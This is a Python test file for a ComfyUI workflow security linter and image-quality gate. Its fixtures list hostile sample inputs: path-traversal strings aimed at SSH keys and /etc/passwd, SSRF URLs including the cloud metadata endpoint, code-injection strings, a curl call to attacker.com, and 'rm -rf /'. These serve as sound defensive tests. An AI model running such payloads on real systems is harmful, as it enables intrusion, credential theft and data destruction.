"""
Comprehensive Unit and Integration Tests for ComfyUI Security Gate & Visual QA.
Tests WorkflowSecurityLinter, ComfySecurityGate, ComfyVisualConsistencyGate, and ComfyEvaluator.
CreativeForge Intelligence Studio v3.0 - Module M07 (Agent H-4).
"""

from __future__ import annotations

import io
import pytest
from PIL import Image, ImageDraw

from services.worker_evaluation.gates.base import (
    GateExecutionContext,
    GateSeverity,
    GateStatus,
)
from services.worker_evaluation.gates.comfy_security_gate import ComfySecurityGate
from services.worker_evaluation.gates.comfy_visual_consistency_gate import (
    ComfyVisualConsistencyGate,
    calculate_palette_deviation,
    compute_style_token_match,
    hex_to_rgb,
    rgb_distance_normalized,
)
from services.worker_evaluation.security_rules import (
    APPROVED_COMFY_NODE_ALLOWLIST,
    DANGEROUS_NODE_CLASSES,
    SecurityScanReport,
    SecurityViolationType,
    WorkflowSecurityLinter,
    check_path_traversal,
    is_ip_private_or_loopback,
    validate_url_security,
)
from services.api.app.modules.evaluations.comfy_evaluator import (
    ComfyEvaluator,
    comfy_evaluator,
)


# --- FIXTURES ---

@pytest.fixture
def safe_comfy_api_workflow():
    """A standard, clean ComfyUI workflow in API prompt format."""
    return {
        "1": {
            "class_type": "CheckpointLoaderSimple",
            "inputs": {"ckpt_name": "sd_xl_base_1.0.safetensors"},
        },
        "2": {
            "class_type": "CLIPTextEncode",
            "inputs": {
                "text": "3d casual mobile game icon, juicy ruby gemstone, vibrant saturation, high fidelity",
                "clip": ["1", 1],
            },
        },
        "3": {
            "class_type": "CLIPTextEncode",
            "inputs": {
                "text": "ugly, blurry, low resolution, dark, deformed",
                "clip": ["1", 1],
            },
        },
        "4": {
            "class_type": "EmptyLatentImage",
            "inputs": {"width": 1024, "height": 1024, "batch_size": 1},
        },
        "5": {
            "class_type": "KSampler",
            "inputs": {
                "model": ["1", 0],
                "positive": ["2", 0],
                "negative": ["3", 0],
                "latent_image": ["4", 0],
                "seed": 42,
                "steps": 25,
                "cfg": 7.5,
                "sampler_name": "euler_ancestral",
                "scheduler": "normal",
                "denoise": 1.0,
            },
        },
        "6": {
            "class_type": "VAEDecode",
            "inputs": {"samples": ["5", 0], "vae": ["1", 2]},
        },
        "7": {
            "class_type": "SaveImage",
            "inputs": {"filename_prefix": "creativeforge_out", "images": ["6", 0]},
        },
    }


@pytest.fixture
def sample_game_dna():
    """Standard Game DNA profile for Match-3 game."""
    return {
        "profile_id": "game_dna_match3_v1",
        "genre": "Match-3",
        "style_tokens": ["3d_casual_isometric", "glossy_juicy_textures", "vibrant_saturation"],
        "palette": {
            "primary": "#FF4081",     # Vibrant Pink
            "secondary": "#7C4DFF",   # Vivid Purple
            "accent": "#FFD700",      # Golden Yellow
            "background": "#1A1A2E",  # Deep Navy
            "surface": "#16213E",
        },
        "brand_constraints": {
            "prohibited_elements": ["fake_os_dialogs", "excessive_gore"],
        },
    }


def create_test_image(
    color: str = "red",
    size: tuple[int, int] = (128, 128),
    draw_pattern: bool = True,
) -> Image.Image:
    """Helper to generate PIL images with controllable sharpness and colors."""
    img = Image.new("RGB", size, color=color)
    if draw_pattern:
        draw = ImageDraw.Draw(img)
        # Draw high-contrast shapes to produce sharp Laplacian edges
        for i in range(10, size[0] - 10, 20):
            draw.rectangle([i, 10, i + 10, size[1] - 10], fill="#FFD700", outline="#7C4DFF")
    return img


# --- PART 1: WORKFLOW SECURITY LINTER TESTS ---

class TestWorkflowSecurityLinter:

    def test_safe_workflow_passes_linting(self, safe_comfy_api_workflow):
        linter = WorkflowSecurityLinter()
        report = linter.lint(safe_comfy_api_workflow)

        assert report.is_safe is True
        assert report.scanned_nodes_count == 7
        assert len(report.issues) == 0
        assert report.failure_code is None
        assert "PASSED" in report.summary

    def test_ui_format_workflow_passes_linting(self):
        ui_workflow = {
            "nodes": [
                {"id": 1, "type": "CheckpointLoaderSimple", "widgets_values": ["v1-5-pruned.safetensors"]},
                {"id": 2, "type": "KSampler", "widgets_values": [42, "randomize", 20, 8.0, "euler", "normal", 1.0]},
                {"id": 3, "type": "SaveImage", "widgets_values": ["ComfyUI"]},
            ],
            "links": [[1, 1, 0, 2, 0, "MODEL"]],
        }
        linter = WorkflowSecurityLinter()
        report = linter.lint(ui_workflow)

        assert report.is_safe is True
        assert report.scanned_nodes_count == 3
        assert len(report.issues) == 0

    @pytest.mark.parametrize("dangerous_class", [
        "PythonExec",
        "RunCommand",
        "CustomScript",
        "SaveImageToSystemPath",
        "LoadExternalFile",
        "ExecuteCode",
        "ShellExecute",
        "BashCommand",
        "SystemCommand",
    ])
    def test_dangerous_nodes_explicitly_blocked(self, safe_comfy_api_workflow, dangerous_class):
        malicious_workflow = dict(safe_comfy_api_workflow)
        malicious_workflow["99"] = {
            "class_type": dangerous_class,
            "inputs": {"code": "print('exploit')"},
        }

        linter = WorkflowSecurityLinter()
        report = linter.lint(malicious_workflow)

        assert report.is_safe is False
        assert report.failure_code == "WORKFLOW_SECURITY_VIOLATION"
        assert any(
            i.issue_type == SecurityViolationType.DANGEROUS_NODE_EXECUTION
            and i.node_class == dangerous_class
            for i in report.issues
        )

    def test_unauthorized_custom_node_rejected(self, safe_comfy_api_workflow):
        unauthorized_workflow = dict(safe_comfy_api_workflow)
        unauthorized_workflow["100"] = {
            "class_type": "UnknownHackerNodeCommunityEdition",
            "inputs": {},
        }

        linter = WorkflowSecurityLinter()
        report = linter.lint(unauthorized_workflow)

        assert report.is_safe is False
        assert any(
            i.issue_type == SecurityViolationType.UNAUTHORIZED_NODE_CLASS
            and i.node_class == "UnknownHackerNodeCommunityEdition"
            for i in report.issues
        )

    @pytest.mark.parametrize("traversal_path", [
        "../../secrets/api_keys.json",
        "..\\..\\windows\\system32\\calc.exe",
        "/etc/passwd",
        "/root/.ssh/id_rsa",
        "C:\\Windows\\win.ini",
        "\\\\192.168.1.5\\share\\exploit.ckpt",
    ])
    def test_path_traversal_in_model_paths_blocked(self, safe_comfy_api_workflow, traversal_path):
        bad_workflow = dict(safe_comfy_api_workflow)
        bad_workflow["1"] = {
            "class_type": "CheckpointLoaderSimple",
            "inputs": {"ckpt_name": traversal_path},
        }

        linter = WorkflowSecurityLinter()
        report = linter.lint(bad_workflow)

        assert report.is_safe is False
        assert any(i.issue_type == SecurityViolationType.PATH_TRAVERSAL for i in report.issues)

    def test_allowed_subfolder_model_paths_pass(self, safe_comfy_api_workflow):
        good_workflow = dict(safe_comfy_api_workflow)
        good_workflow["1"] = {
            "class_type": "CheckpointLoaderSimple",
            "inputs": {"ckpt_name": "sdxl_checkpoints/realvis_v4.safetensors"},
        }

        linter = WorkflowSecurityLinter()
        report = linter.lint(good_workflow)

        assert report.is_safe is True
        assert len(report.issues) == 0

    @pytest.mark.parametrize("private_url", [
        "http://127.0.0.1:8188/prompt",
        "http://localhost:5000/api",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.1/admin",
        "http://192.168.1.1/router",
        "file:///etc/shadow",
    ])
    def test_ssrf_attacks_blocked(self, safe_comfy_api_workflow, private_url):
        ssrf_workflow = dict(safe_comfy_api_workflow)
        ssrf_workflow["8"] = {
            "class_type": "LoadImage",
            "inputs": {"image_url": private_url},
        }

        linter = WorkflowSecurityLinter()
        report = linter.lint(ssrf_workflow)

        assert report.is_safe is False
        assert any(i.issue_type == SecurityViolationType.SSRF_ATTEMPT for i in report.issues)

    def test_whitelisted_external_url_passes(self, safe_comfy_api_workflow):
        whitelisted_workflow = dict(safe_comfy_api_workflow)
        whitelisted_workflow["8"] = {
            "class_type": "LoadImage",
            "inputs": {"image_url": "https://huggingface.co/datasets/sample/resolve/main/texture.png"},
        }

        linter = WorkflowSecurityLinter()
        report = linter.lint(whitelisted_workflow)

        assert report.is_safe is True

    @pytest.mark.parametrize("script_injection", [
        "__import__('os').system('id')",
        "eval('__import__(\"subprocess\").check_output([\"ls\"])')",
        "exec('open(\"/tmp/pwn\", \"w\").write(\"hacked\")')",
        "subprocess.Popen(['curl', 'http://attacker.com'])",
    ])
    def test_unsafe_script_code_blocked(self, safe_comfy_api_workflow, script_injection):
        code_inject_workflow = dict(safe_comfy_api_workflow)
        code_inject_workflow["2"] = {
            "class_type": "CLIPTextEncode",
            "inputs": {"text": script_injection, "clip": ["1", 1]},
        }

        linter = WorkflowSecurityLinter()
        report = linter.lint(code_inject_workflow)

        assert report.is_safe is False
        assert any(i.issue_type == SecurityViolationType.UNSAFE_SCRIPT for i in report.issues)

    def test_malformed_workflow_detected(self):
        linter = WorkflowSecurityLinter()
        report = linter.lint({"invalid_key": "not_a_node"})

        assert report.is_safe is False
        assert any(i.issue_type == SecurityViolationType.MALFORMED_GRAPH for i in report.issues)


# --- PART 2: COMFY SECURITY GATE TESTS ---

class TestComfySecurityGate:

    @pytest.mark.asyncio
    async def test_gate_passes_for_clean_workflow(self, safe_comfy_api_workflow):
        gate = ComfySecurityGate()
        context = GateExecutionContext(
            artifact={
                "artifact_id": "art_comfy_001",
                "type": "comfy_workflow",
                "workflow_json": safe_comfy_api_workflow,
            }
        )
        result = await gate.evaluate(context)

        assert result.status == GateStatus.PASSED
        assert result.severity == GateSeverity.INFO
        assert result.score == 5.0
        assert "verified" in result.message

    @pytest.mark.asyncio
    async def test_gate_fails_fatal_on_malicious_workflow(self, safe_comfy_api_workflow):
        gate = ComfySecurityGate()
        malicious = dict(safe_comfy_api_workflow)
        malicious["bad_node"] = {
            "class_type": "RunCommand",
            "inputs": {"cmd": "whoami"},
        }

        context = GateExecutionContext(
            artifact={
                "artifact_id": "art_comfy_bad",
                "type": "comfy_workflow",
                "workflow_json": malicious,
            }
        )
        result = await gate.evaluate(context)

        assert result.status == GateStatus.FAILED
        assert result.severity == GateSeverity.FATAL
        assert result.failure_code == "WORKFLOW_SECURITY_VIOLATION"
        assert result.is_blocking is True
        assert "RunCommand" in str(result.details)

    @pytest.mark.asyncio
    async def test_gate_skips_when_no_workflow_on_standard_artifact(self):
        gate = ComfySecurityGate()
        context = GateExecutionContext(
            artifact={"artifact_id": "art_standard_png", "type": "image"}
        )
        result = await gate.evaluate(context)

        assert result.status == GateStatus.SKIPPED
        assert result.severity == GateSeverity.INFO


# --- PART 3: COMFY VISUAL CONSISTENCY GATE TESTS ---

class TestComfyVisualConsistencyGate:

    @pytest.mark.asyncio
    async def test_sharp_well_exposed_image_passes(self, sample_game_dna):
        gate = ComfyVisualConsistencyGate()

        # Create sharp, colorful test image matching Game DNA palette (#FF4081, #FFD700)
        img = create_test_image(color="#FF4081", size=(128, 128), draw_pattern=True)

        context = GateExecutionContext(
            artifact={
                "artifact_id": "art_img_good",
                "type": "image",
                "media_meta": {
                    "pil_image": img,
                    "positive_prompt": "3d casual isometric, glossy juicy ruby gemstones, vibrant saturation",
                },
            },
            game_dna=sample_game_dna,
        )

        result = await gate.evaluate(context)

        assert result.status == GateStatus.PASSED
        assert result.score >= 4.0
        assert result.details["laplacian_variance"] > 50.0
        assert result.details["style_token_match_score"] >= 0.8

    @pytest.mark.asyncio
    async def test_blurry_image_fails_with_blurry_code(self, sample_game_dna):
        gate = ComfyVisualConsistencyGate()

        # Flat solid color image produces Laplacian variance = 0.0 (completely blurred/degraded)
        blurry_img = Image.new("RGB", (128, 128), color="#888888")

        context = GateExecutionContext(
            artifact={
                "artifact_id": "art_img_blurry",
                "type": "image",
                "media_meta": {
                    "pil_image": blurry_img,
                },
            },
            game_dna=sample_game_dna,
        )

        result = await gate.evaluate(context)

        assert result.status == GateStatus.FAILED
        assert result.failure_code == "VISUAL_BLURRY_OR_DEGRADED"
        assert result.details["laplacian_variance"] < 10.0

    @pytest.mark.asyncio
    async def test_underexposed_image_fails_exposure_anomaly(self, sample_game_dna):
        gate = ComfyVisualConsistencyGate()

        # Pure black / near black image
        black_img = Image.new("RGB", (128, 128), color=(5, 5, 5))

        context = GateExecutionContext(
            artifact={
                "artifact_id": "art_img_black",
                "type": "image",
                "media_meta": {
                    "pil_image": black_img,
                },
            },
            game_dna=sample_game_dna,
        )

        result = await gate.evaluate(context)

        assert result.status == GateStatus.FAILED
        assert result.failure_code == "VISUAL_EXPOSURE_ANOMALY"

    @pytest.mark.asyncio
    async def test_overexposed_image_fails_exposure_anomaly(self, sample_game_dna):
        gate = ComfyVisualConsistencyGate()

        # Pure white blown-out image
        white_img = Image.new("RGB", (128, 128), color=(254, 254, 254))

        context = GateExecutionContext(
            artifact={
                "artifact_id": "art_img_white",
                "type": "image",
                "media_meta": {
                    "pil_image": white_img,
                },
            },
            game_dna=sample_game_dna,
        )

        result = await gate.evaluate(context)

        assert result.status == GateStatus.FAILED
        assert result.failure_code == "VISUAL_EXPOSURE_ANOMALY"

    @pytest.mark.asyncio
    async def test_precomputed_metadata_fallback(self, sample_game_dna):
        """Test gate evaluation when metrics are supplied via media_meta without PIL file."""
        gate = ComfyVisualConsistencyGate()

        context = GateExecutionContext(
            artifact={
                "artifact_id": "art_meta_only",
                "type": "image",
                "media_meta": {
                    "laplacian_variance": 145.2,
                    "mean_brightness": 122.0,
                    "contrast_stddev": 35.0,
                    "dominant_colors": ["#FF4081", "#FFD700"],
                    "positive_prompt": "3d casual isometric, glossy textures",
                },
            },
            game_dna=sample_game_dna,
        )

        result = await gate.evaluate(context)

        assert result.status == GateStatus.PASSED
        assert result.details["laplacian_variance"] == 145.2
        assert result.details["mean_brightness"] == 122.0

    def test_palette_deviation_calculation(self):
        # Exact palette match
        dna_palette = [hex_to_rgb("#FF4081"), hex_to_rgb("#FFD700")]
        img_palette_match = [hex_to_rgb("#FF4081"), hex_to_rgb("#FFD700")]
        dev_exact = calculate_palette_deviation(img_palette_match, dna_palette)
        assert dev_exact == 0.0

        # Opposing palette
        img_palette_diff = [hex_to_rgb("#000000"), hex_to_rgb("#FFFFFF")]
        dev_diff = calculate_palette_deviation(img_palette_diff, dna_palette)
        assert dev_diff > 0.30

    def test_style_token_scoring(self):
        tokens = ["3d_casual_isometric", "glossy_juicy_textures", "vibrant_saturation"]

        high_match = compute_style_token_match(
            tokens, ["3d casual isometric mobile ad with glossy juicy textures and vibrant saturation"]
        )
        assert high_match == 1.0

        partial_match = compute_style_token_match(
            tokens, ["casual 3d game graphics"]
        )
        assert 0.0 < partial_match < 1.0

        low_match = compute_style_token_match(
            tokens, ["dark gritty monochromatic realistic military shooter"]
        )
        assert low_match <= 0.2


# --- PART 4: COMFY EVALUATOR API INTEGRATION TESTS ---

class TestComfyEvaluatorService:

    def test_standalone_ast_validation(self, safe_comfy_api_workflow):
        report = comfy_evaluator.validate_workflow_ast(safe_comfy_api_workflow)
        assert report.is_safe is True
        assert report.scanned_nodes_count == 7

    @pytest.mark.asyncio
    async def test_hybrid_evaluation_flow_approved(self, safe_comfy_api_workflow, sample_game_dna):
        img = create_test_image(color="#FF4081", size=(128, 128), draw_pattern=True)
        artifact = {
            "artifact_id": "art_hybrid_pass",
            "type": "image",
            "media_meta": {
                "pil_image": img,
                "positive_prompt": "3d casual isometric gem, vibrant saturation",
            },
        }

        response = await comfy_evaluator.evaluate_hybrid_run(
            workflow_json=safe_comfy_api_workflow,
            artifact=artifact,
            game_dna=sample_game_dna,
        )

        assert response.is_approved is True
        assert response.security_verdict == GateStatus.PASSED
        assert response.visual_verdict == GateStatus.PASSED
        assert response.overall_score >= 4.0
        assert len(response.blocking_reasons) == 0

    @pytest.mark.asyncio
    async def test_hybrid_evaluation_flow_rejected_on_security(self, safe_comfy_api_workflow, sample_game_dna):
        bad_workflow = dict(safe_comfy_api_workflow)
        bad_workflow["hacked"] = {
            "class_type": "PythonExec",
            "inputs": {"code": "import os; os.system('pwn')"},
        }

        img = create_test_image(color="#FF4081", size=(128, 128), draw_pattern=True)
        artifact = {
            "artifact_id": "art_hybrid_sec_fail",
            "type": "image",
            "media_meta": {"pil_image": img},
        }

        response = await comfy_evaluator.evaluate_hybrid_run(
            workflow_json=bad_workflow,
            artifact=artifact,
            game_dna=sample_game_dna,
        )

        assert response.is_approved is False
        assert response.security_verdict == GateStatus.FAILED
        assert any("Security Gate failed" in r for r in response.blocking_reasons)

    @pytest.mark.asyncio
    async def test_hybrid_evaluation_flow_rejected_on_visuals(self, safe_comfy_api_workflow, sample_game_dna):
        blurry_img = Image.new("RGB", (128, 128), color="#555555")
        artifact = {
            "artifact_id": "art_hybrid_vis_fail",
            "type": "image",
            "media_meta": {"pil_image": blurry_img},
        }

        response = await comfy_evaluator.evaluate_hybrid_run(
            workflow_json=safe_comfy_api_workflow,
            artifact=artifact,
            game_dna=sample_game_dna,
        )

        assert response.is_approved is False
        assert response.security_verdict == GateStatus.PASSED
        assert response.visual_verdict == GateStatus.FAILED
        assert any("Visual Consistency Gate failed" in r for r in response.blocking_reasons)


# --- PART 5: ARCHITECTURAL DEEPENING & ADAPTIVE CONFIGURATION TESTS ---

class TestArchitecturalEnhancements:

    def test_dynamic_env_allowed_domains(self, monkeypatch, safe_comfy_api_workflow):
        """Verifies COMFY_ALLOWED_DOMAINS env variable dynamically extends SSRF allowlist."""
        monkeypatch.setenv("COMFY_ALLOWED_DOMAINS", "s3.amazonaws.com,minio.enterprise.internal")

        s3_workflow = dict(safe_comfy_api_workflow)
        s3_workflow["custom_loader"] = {
            "class_type": "LoadImage",
            "inputs": {"image_url": "https://s3.amazonaws.com/mybucket/asset.png"},
        }

        linter = WorkflowSecurityLinter()
        report = linter.lint(s3_workflow)
        assert report.is_safe is True

    @pytest.mark.asyncio
    async def test_game_dna_custom_visual_thresholds(self):
        """Verifies Game DNA can adaptively override visual thresholds."""
        gate = ComfyVisualConsistencyGate()

        # Image with variance ~55.5
        gray_img = Image.new("RGB", (128, 128), color="#555555")

        # Game DNA with relaxed blur tolerance (e.g. for stylized painterly games)
        relaxed_dna = {
            "profile_id": "relaxed_style_game",
            "genre": "Casual",
            "brand_constraints": {
                "visual_thresholds": {
                    "critical_blur_threshold": 5.0,  # lower critical threshold
                    "blur_threshold": 40.0,
                }
            },
        }

        context = GateExecutionContext(
            artifact={
                "artifact_id": "art_relaxed",
                "type": "image",
                "media_meta": {
                    "laplacian_variance": 50.0,
                    "mean_brightness": 120.0,
                    "contrast_stddev": 25.0,
                },
            },
            game_dna=relaxed_dna,
        )

        result = await gate.evaluate(context)
        # Should NOT fail as critical blur because 50.0 > 5.0
        assert result.status != GateStatus.FAILED

    @pytest.mark.asyncio
    async def test_pipeline_hybrid_auto_halts_malicious_workflow(self, safe_comfy_api_workflow):
        """Verifies QualityGatePipeline auto-detects ComfyUI workflow and halts on Gate 0."""
        from services.worker_evaluation.pipeline import QualityGatePipeline

        bad_workflow = dict(safe_comfy_api_workflow)
        bad_workflow["pwn"] = {
            "class_type": "ExecuteCode",
            "inputs": {"script": "os.system('id')"},
        }

        pipeline = QualityGatePipeline()  # default 7-gate instance
        context = GateExecutionContext(
            artifact={
                "artifact_id": "art_auto_detect",
                "type": "comfy_workflow",
                "workflow_json": bad_workflow,
            }
        )

        report = await pipeline.run(context)
        assert report.overall_verdict.value == "FAILED"
        assert report.blocking_failure is not None
        assert "comfy_security_gate" in report.blocking_failure
        # Halts immediately; remaining 7 downstream gates are not executed
        assert report.failed_gates_count == 1
        assert len(report.gate_results) == 1

    @pytest.mark.asyncio
    async def test_comfy_service_create_preset_blocks_malicious_workflow(self):
        """Verifies ComfyService.create_preset rejects unapproved or dangerous nodes."""
        from packages.contracts.comfy_contracts import ComfyPresetCreate
        from services.api.app.modules.comfy.service import ComfyService, ComfyValidationError

        service = ComfyService()
        bad_preset = ComfyPresetCreate(
            name="Exploit Workflow",
            category="custom",
            workflow_json={
                "1": {
                    "class_type": "CustomPythonScript",
                    "inputs": {"code": "rm -rf /"},
                }
            },
        )

        with pytest.raises(ComfyValidationError) as exc_info:
            await service.create_preset(bad_preset)

        assert "security violation" in str(exc_info.value).lower()

